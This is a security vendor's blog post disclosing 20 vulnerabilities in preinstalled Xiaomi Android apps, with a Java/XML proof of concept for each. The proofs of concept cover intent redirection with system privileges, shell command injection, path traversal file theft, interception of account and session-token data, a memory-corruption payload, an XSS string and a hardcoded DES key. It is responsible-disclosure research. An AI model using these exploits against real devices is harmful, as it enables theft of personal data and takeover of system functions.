---
source: oversecured
source_url: https://oversecured.com/blog/20-security-issues-found-in-xiaomi-devices
title: "20 Security Issues Found in Xiaomi Devices | Oversecured Blog"
author: "HubSpot, Inc."
description: "Oversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilities"
---

Dast is live!

Run a new scan to see dynamic findings in your reports

[Learn more →](https://oversecured.com/dast)

Oversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilities in Xiaomi led to access to arbitrary activities, receivers and services with system privileges, theft of arbitrary files with system privileges, disclosure of phone, settings and Xiaomi account data, and other vulnerabilities.

We reported these vulnerabilities within 5 days from April 25 to April 30, 2023, to Xiaomi for swift remediation. This article provides a detailed walkthrough of each vulnerability, emphasizing the importance of proactive security practices in mobile technology.

## Security - Intent redirection with system privileges

Oversecured scan report for the Security app (`com.miui.securitycenter`) contained the following vulnerability:

![](https://framerusercontent.com/images/Y6wqn7zRgoZVFZNkv4bIoUgK1yM.png?width=2252&height=3542)

The exported activity `com.miui.wakepath.ui.ConfirmStartActivity` is designed to ask the user for permission to start an activity. However, it does not provide any explanation about the dangers of doing so. In addition, an attacker can control the caller and callee names.

Furthermore, this application is declared with the `android:sharedUserId="android.uid.system"` flag, which makes it a system application. Such applications have many more privileges than any other application. For example, in the context of this vulnerability, an attacker would be able to access arbitrary activities of all applications installed on the user’s device. This includes activities that have the `android:exported="false"` flag or have the permissions set for access.

### Proof of Concept

To test this, we used our own `NotExportedActivity` activity, which has the `android:exported="false"` flag:

```
<activity android:name=".NotExportedActivity" android:exported="false" />
```

```
public class NotExportedActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("evil", "NotExportedActivity.onCreate()");
    }
}
```

And launch it through that vulnerability:

```
Intent next = new Intent();
next.setClass(this, NotExportedActivity.class);

Intent i = new Intent("android.app.action.CHECK_ALLOW_START_ACTIVITY");
i.setClassName("com.miui.securitycenter", "com.miui.wakepath.ui.ConfirmStartActivity");
i.putExtra("android.intent.extra.INTENT", next);
i.putExtra("CalleePkgName", "root");
i.putExtra("CallerPkgName", "root");
i.putExtra("UserId", -1);
startActivity(i);
```

## System Tracing - Shell Command injection

Oversecured scan report for the System Tracing app (`com.android.traceur`) contained the following vulnerability:

![](https://framerusercontent.com/images/9t8RHvpYQFJ8mWnNrsCtmLCnyY.png?width=2250&height=6098)

This app also comes from AOSP, but has been modified by Xiaomi. They added custom code to extend the dump functionality to the exported `com.android.traceur.AppReceiver` receiver, which does not check the received values and passes them directly to `sh`.

### Proof of Concept

```
Intent i = new Intent("com.android.traceur.AppReceiver");
i.putExtra("ACTION", "traceutil_delete");
i.putExtra("ACTION_DELETE_FILE", ".perfetto-trace && log -t evil 1337");
sendBroadcast(i);
```

## Settings - Binding arbitrary services with system privileges

Oversecured scan report for the Security app (`com.android.settings`) contained the following vulnerability:

![](https://framerusercontent.com/images/nxuZukp3rM6NpmSjMfN2QIP9q00.png?width=2252&height=3132)

This app also comes from AOSP, but has been patched by Xiaomi. They changed the code in `com.android.settings.wifi.dpp.WifiDppEnrolleeActivity`, replacing the original initial inheritor of `androidx.appcompat.app.AppCompatActivity` with `miuix.appcompat.app.AppCompatActivity`. It has the `miuix.appcompat.app.AppDelegate` delegate which calls `miuix.appcompat.app.floatingactivity.multiapp.MultiAppFloatingActivitySwitcher.install()` where it accepts the attacker controlled values `floating_service_pkg` and `floating_service_path`. These values are treated as the component name used to bind the service. We believe this is an SDK issue as it is present in many Xiaomi apps, making them vulnerable. This is dangerous because an attacker can launch any potentially sensitive functionality in all apps installed on the user’s device.

Moreover, as in the previous vulnerability, Settings is a system app, so this functionality allows the attacker to bind absolutely any service declared on the user’s device in any of the installed apps.

### Proof of Concept

As previously, we used our own `MyNotExportedService` to test the vulnerability:

```
public class MyNotExportedService extends Service {
    public IBinder onBind(Intent intent) {
        Log.d("evil", "MyNotExportedService.onBind()");
        return null;
    }
}
```

This code triggers the service:

```
Intent i = new Intent("android.settings.WIFI_DPP_ENROLLEE_QR_CODE_SCANNER");
i.setClassName("com.android.settings", "com.android.settings.wifi.dpp.WifiDppEnrolleeActivity");
i.putExtra("floating_service_pkg", getPackageName());
i.putExtra("floating_service_path", MyNotExportedService.class.getCanonicalName());
startActivity(i);
```

## Settings - Theft of arbitrary files with system privileges

Oversecured scan report for the Security app (`com.android.settings`) contained the following vulnerability:

![](https://framerusercontent.com/images/Z7UHf0mfG1DU5fkrNUYsGaqobA.png?width=2248&height=1182)

Similar to the previous vulnerability, Xiaomi added the exported `com.android.settings.bluetooth.MiuiFastConnectResourceProvider`provider to the app. This provider requests a system permission to read files, but does not internally check if the file access flag is set to read files. In addition, the provider code contains attempts to protect against bad URIs, but they are insufficient. For example, the two validations `uri.toString().endsWith(".zip") && !uri.toString().contains("../")` can be bypassed using URI tricks such as encoding and URI hash part.

### Proof of Concept

```
Uri uri = Uri.parse("content://com.android.settings.bluetooth.MiuiFastConnectResourceProvider/..%2F..%2F..%2F..%2F..%2Fdata/system/users/0/settings_secure.xml#.zip");
try {
    ParcelFileDescriptor pfd = getContentResolver().openFileDescriptor(uri, "w");
    try (InputStream inputStream = new FileInputStream(pfd.getFileDescriptor())) {
        Log.d("evil", IOUtils.toString(inputStream));
    }
} catch (Throwable th) {
    throw new RuntimeException(th);
}
```

## Settings - Implicit broadcasts expose Bluetooth and Wi-Fi data

Oversecured scan report for the Settings app (`com.android.settings`) contained the following vulnerability:

![](https://framerusercontent.com/images/UmEgg8PaWmo35cJEnIXVIWvM.png?width=2250&height=3960)

Xiaomi added its own functionality for additional settings that were not present in AOSP. As a result, these intents began to leak information about Bluetooth devices, connected Wi-Fi networks, and emergency contacts.

### Proof of Concept

File `AndroidManifest.xml`:

```
<receiver android:name=".MyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="DELIVERED_SMS_ACTION0" />
        <action android:name="DELIVERED_SMS_ACTION1" />
        <action android:name="DELIVERED_SMS_ACTION2" />
        <action android:name="DELIVERED_SMS_ACTION3" />
        <!-- ... -->
        <action android:name="miui.intent.action.ACTIVE_RE_REGISTRATION_NETWORK" />
        <action android:name="com.miui.action.PASSPOINT_WIFI_LOGIN" />
        <action android:name="android.bluetooth.settings.action.FASTCONNECT_MODIFICATION_COMPLETED" />
    </intent-filter>
</receiver>
```

File `MyReceiver.java`:

```
public class MyReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent i) {
        DumpUtils.dump(i, context.getClassLoader());
    }
}
```

File `DumpUtils.java`:

```
public class DumpUtils {
    public static void dump(Intent intent, ClassLoader classLoader) {
        if (intent == null) {
            return;
        }
        print(toJson(intent, classLoader));
    }

    private static JsonObject toJson(Intent intent, ClassLoader classLoader) {
        JsonObject o = new JsonObject();
        if (intent.getAction() != null) {
            o.addProperty("action", intent.getAction());
        }
        if (intent.getDataString() != null) {
            o.addProperty("data", intent.getDataString());
        }
        if (intent.getCategories() != null && !intent.getCategories().isEmpty()) {
            o.add("categories", toJson(intent.getCategories()));
        }
        if (intent.getFlags() != 0) {
            o.addProperty("flags", intent.getFlags());
        }
        if (intent.getClipData() != null) {
            o.add("clipData", toJson(intent.getClipData()));
        }
        if (intent.getSelector() != null) {
            o.add("selector", toJson(intent.getSelector(), classLoader));
        }
        if (intent.getExtras() != null) {
            o.add("extras", toJson(intent.getExtras(), classLoader));
        }
        return o;
    }

    private static JsonObject toJson(Bundle bundle, ClassLoader classLoader) {
        JsonObject o = new JsonObject();
        bundle.setClassLoader(classLoader);
        for (String key : bundle.keySet()) {
            Object value = bundle.get(key);
            JsonElement parsedValue;
            if (value instanceof Intent) {
                parsedValue = toJson((Intent) value, classLoader);
            } else if (value instanceof Bundle) {
                parsedValue = toJson((Bundle) value, classLoader);
            } else {
                parsedValue = toJson(value);
            }
            o.add(key, parsedValue);
        }
        return o;
    }

    private static JsonElement toJson(Object value) {
        return getGson().toJsonTree(value);
    }

    private static Gson getGson() {
        return new GsonBuilder().setPrettyPrinting().create();
    }

    private static Iterable<String> split(String s) {
        return Splitter.fixedLength(500)
                .omitEmptyStrings()
                .split(s);
    }

    private static void print(JsonObject o) {
        String prettyString = getGson().toJson(o);
        for(String data : split(prettyString)) {
            Log.d("evil", data);
        }
    }
}
```

## Settings - Implicit activity intents expose Xiaomi account, Wi-Fi, Bluetooth data, and phone numbers

Oversecured scan report for the Settings app (`com.android.settings`) contained the following vulnerability:

![](https://framerusercontent.com/images/ZA3rSucm7O3Mv05WpXp1PcHpQkE.png?width=2252&height=17010)

This vulnerability is similar to the previous one, but the only difference is the way to intercept the implicit intents, it’s using `activity` instead of `receiver`, and also in the leaked data: it additionally includes Xiaomi account details and filtered phone numbers.

### Proof of Concept

File `AndroidManifest.xml`:

```
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="miui.intent.action.SELECT_WIFI_AP" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="android.settings.XIAOMI_ACCOUNT_SYNC_SETTINGS" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="miui.intent.action.ADD_FIREWALL" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="miui.intent.action.SWITCH_TO_WIFI" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="android.settings.NETWORK_PROVIDER_SETTINGS" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="miui.bluetooth.action.HEADSET_SETTINGS" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="miui.bluetooth.action.HEADSET_SETTINGS_PLUGIN" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="miui.settings.WIFI_DPP_ENROLLEE_QR_CODE_SCANNER" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="miui.bluetooth.action.PICK_DEVICE" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.xiaomi.action.MICLOUD_MEMBER" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

File `InterceptActivity.java`:

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    DumpUtils.dump(getIntent(), getClassLoader());
    finish();
}
```

## GetApps - Memory corruption

Oversecured scan report for the GetApps app (`com.xiaomi.mipicks`) contained the following vulnerability:

![](https://framerusercontent.com/images/XQIPxv32u97xbIMaomzgvuMFGGw.png?width=2250&height=3880)

This vulnerability comes from the [LiveEventBus](https://github.com/JeremyLiao/LiveEventBus) library. We informed the developer more than a year ago, but apparently they still haven’t read our message and have not released any updates to the library.

The problem is an insecure broadcast receiver registered in the `com/jeremyliao/liveeventbus/core/LiveEventBusCore.java` file. A third-party application installed on the same device can send a broadcast with the `intent.action.ACTION_LEB_IPC` action and specify arbitrary JSON data. The attacker could then use the Gson library to create arbitrary Java objects, including those containing native pointers. This will result in memory corruption if these objects are destroyed. We described this attack vector in more detail in the article [Exploiting Memory Corruption Vulnerabilities in Android](https://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android/) when we found a similar bug in PayPal applications.

### Proof of Concept

```
Intent i = new Intent("intent.action.ACTION_LEB_IPC");
i.setPackage("com.xiaomi.mipicks");
i.putExtra("leb_ipc_key", "smth");
i.putExtra("leb_ipc_value_type", 10);
i.putExtra("leb_ipc_class_name", "com.android.internal.util.VirtualRefBasePtr");
i.putExtra("leb_ipc_value", "{'mNativePtr':3735928551}");
sendBroadcast(i);
```

## GetApps - Intent redirection (1)

Oversecured scan report for the GetApps app (`com.xiaomi.mipicks`) contained the following vulnerability:

![](https://framerusercontent.com/images/mRY68ySqBTtE582Ur28np7Seup8.png?width=2248&height=1434)

The `com.xiaomi.market.ui.MainUserAgreementActivity` activity is exported and its base `BaseUserAgreementActivity` activity takes the `targetIntent` parameter, validates that it’s launching an activity from GetApps, and passes this intent to `startActivity()`. This allows an attacker to access any activities of this application that aren’t exported. Additionally, an attacker can access, e.g., `com.xiaomi.market.ui.UnlockActivity` as a proxy to redirect the intent to other apps due to missed validation in it.

### Proof of Concept

```
Intent next = new Intent(Intent.ACTION_VIEW, Uri.parse("https://google.com/")); // any other intent

Intent proxy = new Intent();
proxy.setClassName("com.xiaomi.mipicks", "com.xiaomi.market.ui.UnlockActivity");
proxy.putExtra("pendingIntentAction", next);

Intent i = new Intent();
i.setClassName("com.xiaomi.mipicks", "com.xiaomi.market.ui.MainUserAgreementActivity");
i.putExtra("targetIntent", proxy);
startActivity(i);
```

## GetApps - Intent redirection (2)

Oversecured scan report for the GetApps app (`com.xiaomi.mipicks`) contained the following vulnerability:

The app contains an exported `com.xiaomi.market.appchooser.AppChooserActivity` activity that passes an attacker-controlled `targetIntent` to `startActivity()`, allowing an attacker to access any not exported activities declared in the app.

### Proof of Concept

This time we launched `DebugPreferenceFragmentActivity`:

```
Intent next = new Intent();
next.setData(Uri.parse("https://not_empty"));
next.setClassName("com.xiaomi.mipicks", "com.xiaomi.market.ui.debug.DebugPreferenceFragmentActivity");

Intent i = new Intent("com.xiaomi.market.RESOLVER");
i.setClassName("com.xiaomi.mipicks", "com.xiaomi.market.appchooser.AppChooserActivity");
i.putExtra("targetIntent", next);
startActivity(i);
```

## GetApps - Implicit activity intents expose the session token

Oversecured scan report for the GetApps app (`com.miui.videoplayer`) contained the following vulnerability:

![](https://framerusercontent.com/images/IkZkaI4yH4iyYU0C1zAYzqLo9rE.png?width=2250&height=1962)

In the `com/xiaomi/market/h52native/utils/ClickTriggerUtil.java` file, the app uses implicit intents that expose sensitive data such as Xiaomi session tokens to all third-party apps installed on the same device.

### Proof of Concept

```
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.xiaomi.global.payment.MI_PAYMETHOD" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.xiaomi.global.payment.MI_ORDERSLIST" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

Next, the proof of concept dumps the received data in `InterceptActivity`.

## Security Core Component - Automatically removing the current user

Oversecured scan report for the Security Core Component app (`com.miui.securitycore`) contained the following vulnerability:

![](https://framerusercontent.com/images/wM7nYoGxhkbU9xQPeMUqpm7C7p4.png?width=2248&height=3450)

The application contains an exposed dynamically registered broadcast receiver in the `com/miui/securityspace/service/SecondSpaceService.java` file. When it receives a broadcast with the `com.miui.securitycore.ACTION_TO_REMOVE_USER` action, it stops the current user, deletes it, and then locks the screen.

### Proof of Concept

```
sendBroadcast(new Intent("com.miui.securitycore.ACTION_TO_REMOVE_USER"));
```

## Security Core Component - Starting arbitrary broadcast receivers with system privileges

Oversecured scan report for the Security Core Component app (`com.miui.securitycore`) contained the following vulnerability:

![](https://framerusercontent.com/images/6qEhut7P68CWtyEmGPrmC7IbjQ.png?width=2248&height=1556)

As you can see in the screenshot, the problem is that the app resets the component value but keeps the selector. When an attacker sends a broadcast to this receiver, they can provide both values and the intent will be delivered to the Xiaomi receiver first, but after that, it will be redirected to a receiver provided by the attacker. However, the action can only be `android.intent.action.MEDIA_SCANNER_SCAN_FILE` or `miui.intent.action.MEDIA_SCANNER_SCAN_FOLDER`, that’s the only restriction here. This vulnerability allows an attacker to access arbitrary receivers of arbitrary applications installed on the same device. This happens because this is a system application and has access to absolutely all broadcast receivers registered in any of the applications installed on the user’s device.

### Proof of Concept

As with previous Intent redirection vulnerabilities, we used our own `MyNotExportedReceiver` to test the vulnerability:

```
public class MyNotExportedReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        Log.d("evil", "MyNotExportedReceiver.onReceive()");
        Log.d("evil", "key: " + intent.getStringExtra("key"));
    }
}
```

This code triggers the receiver:

```
Intent i = new Intent("android.intent.action.MEDIA_SCANNER_SCAN_FILE");
i.setClassName("com.miui.securitycore", "com.miui.xspace.receiver.MediaScannerReceiver");
i.setSelector(new Intent().setClassName(getPackageName(), MyNotExportedReceiver.class.getCanonicalName()));
i.putExtra("key", "extra_value_example");
sendBroadcast(i);
```

## MIUI Bluetooth - Theft of arbitrary files with `android.uid.bluetooth`privileges

Oversecured scan report for the MIUI Bluetooth app (`com.xiaomi.bluetooth`) contained the following vulnerability:

![](https://framerusercontent.com/images/b7Qki9393sNZYxNoZEmkIdlTWl0.png?width=2250&height=1218)

The application includes the exported `com.android.bluetooth.ble.app.headset.HeadsetProvider` provider. It doesn’t somehow validate the resulting `File` object, allowing an attacker to perform a path traversal attack. It is also declared with the `android:sharedUserId="android.uid.bluetooth"` flag, allowing it to access other applications with the same flag and some other privileges.

### Proof of Concept

For testing, we used a file on the SD card:

```
Uri uri = Uri.parse("content://com.android.bluetooth.ble.app.headset.provider/plugin_update/../../../../../sdcard/test.txt");
try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
    Log.d("evil", IOUtils.toString(inputStream));
} catch (Throwable th) {
    throw new RuntimeException(th);
}
```

## MIUI Bluetooth - Implicit broadcast intents expose Bluetooth data

Oversecured scan report for the MIUI Bluetooth app (`com.xiaomi.bluetooth`) contained the following vulnerability:

![](https://framerusercontent.com/images/zBY9SJn8ayelNlhch3ZZYezB2RU.png?width=2254&height=5832)

As you can see in the screenshots, the app does not request permissions from the receivers of these broadcasts, but it does disclose information about the connected Bluetooth devices. However, it is typical in Android to request at least the `android.permission.BLUETOOTH` permission to access any Bluetooth data.

### Proof of Concept

File `AndroidManifest.xml`:

```
<receiver android:name=".MyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.android.bluetooth.headset.click.antilost_notification" />
        <action android:name="com.android.bluetooth.headset.notification.cancle" />
        <action android:name="com.android.bluetooth.headset.click.detail_notification" />
        <action android:name="miui.intent.action.SPATIAL_AUDIO_DEVICE_CONNECT" />
        <action android:name="com.android.bluetooth.headset.cancel.antilost" />
    </intent-filter>
</receiver>
```

Next, the proof of concept dumps the received data in `MyReceiver`.

## Phone Services - Implicit activity intents expose telephony data

Oversecured scan report for the Phone Services app (`com.android.phone`) contained the following vulnerability:

![](https://framerusercontent.com/images/DvsW2il7FEsl7twcPgFA8CdrNqI.png?width=2250&height=5044)

This app also comes from AOSP, but has been patched by Xiaomi. They added custom functionality, but it was vulnerable to implicit intent hijacking that exposed system values such as ICCID or IMSI of virtual SIMs.

### Proof of Concept

File `AndroidManifest.xml`:

```
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="org.codeaurora.settings.CDMA_CALL_FORWARDING" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.android.phone.CallFeaturesSetting.ADD_VOICEMAIL" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.miui.virtualsim.action.CARD_ACTIVATE" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

Next, the proof of concept dumps the received data in `InterceptActivity`.

## ShareMe - Hardcoded DES key is used to handle private files

Oversecured scan report for the ShareMe app (`com.xiaomi.midrop`) contained the following vulnerability:

![](https://framerusercontent.com/images/IDt86kw6XO2jAGspQmaK1cOXlA.png?width=2310&height=1716)

This key is used to encrypt information about private files, which are then stored on the SD card in the `/sdcard/ShareMe/safebox/` directory.

### Proof of Concept

The following code should be used to decrypt the data:

```
public static String decrypt(String str) {
    try {
        SecretKey generateSecret = SecretKeyFactory.getInstance("DES").generateSecret(new DESKeySpec("miuiMidrop".getBytes()));
        byte[] decode = Base64.decode(str, 0);
        Cipher cipher = Cipher.getInstance("DES");
        cipher.init(2, generateSecret);
        return new String(cipher.doFinal(decode));
    } catch (Exception unused) {
        return str;
    }
}
```

## Gallery - Gaining access to arbitrary\* content providers

Oversecured scan report for the Gallery app (`com.miui.gallery`) contained the following vulnerability:

![](https://framerusercontent.com/images/mIHWwRlvWgq4ttgAKQiTnuGLM.png?width=2248&height=2672)

The application launches an implicit intent to select a URI for the user’s avatar. This intent can be intercepted by any third-party application installed on the same device. Then the app contains 2 bugs at once: automatically granting read permissions to all applications that can handle the `com.android.camera.action.CROP` action (for this purpose it is enough to create any exported activity that has a corresponding `intent-filter`) and then launching this intent with flag `1`(`Intent.FLAG_GRANT_READ_URI_PERMISSION`) and the attacker’s URI in the data field, which allows to intercept this intent and also read data from this URI. This vulnerable code is present in several Xiaomi apps.

### Proof of Concept

File `AndroidManifest.xml`:

```
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="android.intent.action.PICK" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:mimeType="*/*" />
        <data android:mimeType="image/*" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.android.camera.action.CROP" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:mimeType="*/*" />
        <data android:mimeType="image/*" />
    </intent-filter>
</activity>
```

File `InterceptActivity.java`:

```
public class InterceptActivity extends Activity {
    private static final Uri CONTACTS_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;

    private Runnable dumpWaiter = () -> {
        while (true) {
            try {
                Thread.sleep(100);
                dump(CONTACTS_URI); // wait when the Gallery app grants access permission
                return;
            } catch (Throwable th) {
            }
        }
    };

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if ("android.intent.action.PICK".equals(getIntent().getAction())) {
            setResult(-1, new Intent().setData(CONTACTS_URI));
            new Thread(dumpWaiter).start();
        } else {
            dump(getIntent().getData());
        }
        finish();
    }

    public void dump(Uri uri) {
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
        if (cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        } else {
            Log.d("evil", "empty");
        }
    }
}
```

## Xiaomi Cloud - XSS in the built-in WebView

Oversecured scan report for the Xiaomi Cloud app (`com.xiaomi.mipicks`) contained the following vulnerability:

![](https://framerusercontent.com/images/W0YtZOzCymjqQH28g4KKDXYzAQ.png?width=2250&height=2160)

The `com/miui/cloudservice/hybrid/ShareLocationHybridActivity.java`file contains an unprotected dynamically registered broadcast receiver that takes the `push_data` value, concatenates it to JS code, and then executes it.

### Proof of Concept

Before testing, the Xiaomi Cloud app needs to be launched, so it registers the dynamic broadcast receiver:

```
Intent i = new Intent("ACTION_DATA_CHANGED");
i.putExtra("push_data", "'-document.write(1337)-'");
sendBroadcast(i);
```

## Print Spooler - (Over-) writing arbitrary files

Oversecured scan report for the Print Spooler app (`com.android.printspooler`) contained the following vulnerability:

![](https://framerusercontent.com/images/hiNtbo6VcHzObcMwX4Pa0OgJrRM.png?width=2254&height=3116)

This app also comes from AOSP, but has been patched by Xiaomi. The app processes third-party URIs in the exported `com.android.printspooler.convertpdf.ConvertPdfAlertActivity`activity. It automatically caches the content from it and uses the attacker-controlled `_display_name` value to form the output file path. The application uses the `androidx.documentfile` AndroidX library. However, both it and Android Framework classes such as `android.provider.DocumentsProvider` do not validate values in any way. This allows the attacker to inject special characters like `/` and extend the attack.

### Proof of Concept

File `AndroidManifest.xml`:

```
<provider android:name=".MyContentProvider" android:authorities="test.provider" android:exported="true" />
```

File `MainActivity.java`:

```
Intent i = new Intent();
i.setData(Uri.parse("content://test.provider/something"));
i.setClassName("com.android.printspooler", "com.android.printspooler.convertpdf.ConvertPdfAlertActivity");
startActivity(i);
```

File `MyContentProvider.java`:

```
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
    matrixCursor.addRow(new Object[]{"../../test.txt"});
    return matrixCursor;
}

public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    return ParcelFileDescriptor.open(makeFile(), ParcelFileDescriptor.MODE_READ_ONLY);
}

private File makeFile() {
    File path = new File(getContext().getApplicationInfo().dataDir, "test.txt");
    if (!path.exists()) {
        try (OutputStream outputStream = new FileOutputStream(path)) {
            outputStream.write("test".getBytes());
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
    return path;
}
```

## Mi Video - Implicit broadcasts expose Xiaomi account info

Oversecured scan report for the Mi Video app (`com.miui.videoplayer`) contained the following vulnerability:

![](https://framerusercontent.com/images/BNrvzTTkrwd5OxuvU75hkUeSgHQ.png?width=2248&height=5138)

The application uses implicit intents to send information (such as the user’s name and email) via broadcasts. Any third-party application can intercept these broadcasts using its own broadcast receivers.

### Proof of Concept

File `AndroidManifest.xml`:

```
<receiver android:name=".MyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="android.accounts.LOGIN_ACCOUNTS_POST_CHANGED" />
        <action android:name="com.xiaomi.accounts.LOGIN_ACCOUNTS_POST_CHANGED" />
        <action android:name="android.accounts.LOGIN_ACCOUNTS_PRE_CHANGED" />
        <action android:name="com.xiaomi.accounts.LOGIN_ACCOUNTS_PRE_CHANGED" />
    </intent-filter>
</receiver>
```

Next, the proof of concept dumps the received data in `MyReceiver`.

## Conclusions

By incorporating mobile vulnerability scanners into the development process, development teams can identify and remediate security vulnerabilities before release, reducing the likelihood of exploitation and data breaches. This proactive approach significantly enhances product security and ensures the safety of end-users.

If you want to enhance your mobile app’s security, explore Oversecured for comprehensive vulnerability scanning. [Contact us](https://app.oversecured.com/contact-us) to learn more or arrange a demo.

##### Keep reading

[View all](https://oversecured.com/blog)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)\\
\\
Android deep link vulnerabilities: how intent filters lead to account takeover\\
\\
A technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.\\
\\
Android Security\\
\\
Apr 27, 2026\\
\\
8\\
\\
min read](https://oversecured.com/blog/android-deep-link-vulnerabilities)

[![](https://framerusercontent.com/images/xSiSLs1y7y6Mzr4lWYWCpFoYmM4.png?width=2848&height=1656)\\
\\
Android security checklist: theft of arbitrary files\\
\\
Developers for Android do a lot of work with files and exchange them with other apps, for example, to get photos, images, or user data. \\
\\
Android Security\\
\\
May 20, 2022\\
\\
11\\
\\
min read\\
\\
TOp article](https://oversecured.com/blog/android-security-checklist-theft-of-arbitrary-files)

[![](https://framerusercontent.com/images/pzmPwb8meXTvehy3juezcWM86w.png?width=1424&height=828)\\
\\
Android security checklist: WebView\\
\\
WebView is a web browser that can be built into an app, and represents the most widely used component of the Android ecosystem; it is also subject to the largest number of potential\\
\\
Android Security\\
\\
Oct 29, 2021\\
\\
13\\
\\
min read](https://oversecured.com/blog/android-security-checklist-webview)

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

[Blog](https://oversecured.com/blog)

[Partner](https://oversecured.com/partner)

[Wall of fame](https://oversecured.com/cve)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](https://oversecured.com/privacy)

[Terms of use](https://oversecured.com/terms)

[go up ↑](https://oversecured.com/blog/20-security-issues-found-in-xiaomi-devices#header)

Chat Widget